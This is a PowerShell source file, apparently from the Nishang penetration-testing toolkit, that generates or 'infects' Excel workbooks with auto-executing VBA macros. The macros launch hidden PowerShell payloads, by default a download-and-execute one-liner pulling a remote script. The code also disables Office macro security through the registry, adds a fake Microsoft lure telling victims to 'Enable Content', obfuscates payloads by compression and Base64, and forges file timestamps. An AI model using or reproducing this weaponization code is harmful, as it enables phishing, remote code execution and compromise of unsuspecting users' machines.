
function Out-Excel
{

<#
.SYNOPSIS
Nishang Script which can generate and "infect" existing excel files with an auto executable macro. 

.DESCRIPTION
The script can create as well as "infect" existing excel files with an auto executable macro. Powershell payloads
could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing excrl
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro enabled xls file is generated from a xlsx file and for existing .xls files, the macro code is inserted.
LastWriteTime of the xlsx file is set to the newly generated xls file. If the RemoveXlsx switch is enabled, the 
original xlsx is removed and the data in it is lost.

When a weapnoized Excel file is generated, it contains a template to trick the target user in enabling content.

.PARAMETER Payload
Payload which you want to execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER PayloadScript
Path to a PowerShell script on local machine. 
Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself. 

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target. To be used with PayloadURL parameter.

.PARAMETER ExcelFileDir
The directory which contains MS Excel files which are to be "infected".

.PARAMETER OutputFile
The path for the output Excel file. Default is Salary_Details.doc in the current directory.

.PARAMETER Recurse
Recursively look for Excel files in the ExcelFileDir

.PARAMETER RemoveDocx
When using the ExcelFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainSafe
Use this switch to turn on Macro Security on your machine after using Out-Excel.

.EXAMPLE
PS > Out-Excel -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process" -RemainSafe

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
in the current directory.

.EXAMPLE
PS > Out-Excel -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 

Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
you must pass the parameters in the script itself. A file named "Salary_Details.doc" would be generated in the 
current directory with the script used as encoded payload.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.doc" would be generated  in the current directory.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/Powerpreter.psm1 -Arguments "Invoke-PsUACMe;Get-WLAN-Keys"

Use above for multiple payloads. The idea is to use a script or module as payload which loads multiple functions. 

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\

In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\ -Recurse

The above command would search recursively for .docx files in C:\docfiles.

.EXAMPLE
PS > Out-Excel -PayloadURL http://yourwebserver.com/evil.ps1 -ExcelFileDir C:\docfiles\ -Recurse -RemoveDocx

The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
delete the original files.

.EXAMPLE
PS > Out-Excel -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -RemainSafe

Out-Excel turns off Macro Security. Use -RemainSafe to turn it back on.

.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>


    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $PayloadScript,

        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $Arguments,
        
        [Parameter(Position=4, Mandatory = $False)]
        [String]
        $ExcelFileDir,
        
        [Parameter(Position=5, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.xls",

        
        [Parameter(Position=6, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $RemoveXlsx,

        [Parameter(Position=8, Mandatory = $False)]
        [Switch]
        $RemainSafe
    )
    
    #http://stackoverflow.com/questions/21278760/how-to-add-vba-code-in-excel-worksheet-in-powershell
    $Excel = New-Object -ComObject Excel.Application
    $ExcelVersion = $Excel.Version
    #Check for Office 2007 or Office 2003
    if (($ExcelVersion -eq "12.0") -or  ($ExcelVersion -eq "11.0"))
    {
        $Excel.DisplayAlerts = $False
    }
    else
    {
        $Excel.DisplayAlerts = "wdAlertsNone"
    }    

    #Determine names for the Excel versions. To be used for the template generated for tricking the targets.
    
    switch ($ExcelVersion)
    {
        "11.0" {$ExcelName = "2003"}
        "12.0" {$ExcelName = "2007"}
        "14.0" {$ExcelName = "2010"}
        "15.0" {$ExcelName = "2013"}
        "16.0" {$ExcelName = "2016"}
        default {$ExcelName = ""}
    }



    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

    if(!$Payload)
    {
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }


    #Macro Code
    #Macro code from here http://enigma0x3.Excelpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
    $CodeAuto = @"
    Sub Auto_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

    $CodeWorkbook = @"
    Sub Workbook_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@


    if($PayloadScript)
    {
        #Logic to read, compress and Base64 encode the payload script.
        $Enc = Get-Content $PayloadScript -Encoding Ascii
    
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Enc | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
    
        # Base64 encode stream
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +

        "`$(New-Object IO.Compression.DeflateStream (" +

        "`$(New-Object IO.MemoryStream (,"+

        "`$([Convert]::FromBase64String('$Compressed')))), " +

        "[IO.Compression.CompressionMode]::Decompress)),"+

        " [Text.Encoding]::ASCII)).ReadToEnd();"

        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
        $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
    }

    #Use line-continuation for longer payloads like encodedcommand or scripts.
    #Though many Internet forums disagree, hit and trial shows 800 is the longest line length. 
    #There cannot be more than 25 lines in line-continuation.
    $index = [math]::floor($Payload.Length/800)
    if ($index -gt 25)
    {
        Write-Warning "Payload too big for VBA! Try a smaller payload."
        break
    }
    $i = 0
    $FinalPayload = ""
    
    if ($Payload.Length -gt 800)
    {
        #Playing with the payload to fit in multiple lines in proper VBA syntax.
        while ($i -lt $index )
        {
            $TempPayload = '"' + $Payload.Substring($i*800,800) + '"' + " _" + "`n" 
            
            #First iteration doesn't need the & symbol.
            if ($i -eq 0)
            {
                $FinalPayload = $TempPayload
            }
            else
            {
                $FinalPayload = $FinalPayload + "& " + $TempPayload
            }            
            $i +=1

        }

        $remainingindex = $Payload.Length%800
        if ($remainingindex -ne 0)
        {
            $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
        }
        $Payload = $FinalPayload

    }
    #If the payload is small in size, there is no need of multiline macro.
    else
    {
        #Macro Code (inspired from metasploit)
        $code_one = @"

        Sub Execute
            Dim payload
            payload = "$Payload"
            Call Shell(payload, vbHide)
        End Sub

        Sub Auto_Open()
            Execute
        End Sub
        Sub Workbook_Open()
            Execute
        End Sub

"@
    }


  
    if ($ExcelFileDir)
    {
        $ExcelFiles = Get-ChildItem $ExcelFileDir *.xlsx
        if ($Recurse -eq $True)
        {
            $ExcelFiles = Get-ChildItem -Recurse $ExcelFileDir *.xlsx
        }
        ForEach ($ExcelFile in $ExcelFiles)
        {
            $Excel = New-Object -ComObject Excel.Application
            $Excel.DisplayAlerts = $False
            $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
            $ExcelModule.CodeModule.AddFromString($code_one)
            $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
            #Append .xls to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $ExcelFile.FullName + ".xls"
            }
            $WorkBook.Saveas($SavePath, 18)
            Write-Output "Saved to file $SavePath"
            $Excel.Workbooks.Close()
            $LastModifyTime = $ExcelFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveXlsx -eq $True)
            {
                Write-Output "Deleting $($ExcelFile.FullName)"
                Remove-Item -Path $ExcelFile.FullName
            }
            $Excel.Quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
        }
    }
    else
    {
        $WorkBook = $Excel.Workbooks.Add(1)
        $WorkSheet=$WorkBook.WorkSheets.item(1)
        $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
        $ExcelModule.CodeModule.AddFromString($code_one)

        #Add stuff to trick user in Enabling Content (running macros)
        
        $LinkToFile = $False
        $SaveWithDocument = $True
        $Left = 48 * 2
        $Top = 15 * 2
        $Width =48 * 2
        $Height = 15 * 4
        $MSLogoPath = ".\microsoft-logo.jpg"
        if (Test-Path $MSLogoPath)
        {
            $WorkSheet.Shapes.AddPicture((Resolve-Path $MSLogoPath), $LinkToFile, $SaveWithDocument,$Left, $Top, $Width, $Height) | Out-Null
        }

        $WorkSheet.Cells.Item(4,5).Font.Size = 32
        $WorkSheet.Cells.Item(4,5) = "This document was edited in a"
        $WorkSheet.Cells.Item(5,5).Font.Size = 32
        $WorkSheet.Cells.Item(5,5) = "different version of Microsoft Excel."
        $WorkSheet.Cells.Item(6,5).Font.Size = 32
        $WorkSheet.Cells.Item(6,5) = "To load the document, "
        $WorkSheet.Cells.Item(7,5).Font.Size = 36
        $WorkSheet.Cells.Item(7,5) = "please Enable Content"
        
        $WorkBook.SaveAs($OutputFile, 18)
        Write-Output "Saved to file $OutputFile"
        $Excel.Workbooks.Close()
        $Excel.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
    }

    if ($RemainSafe -eq $True)
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}
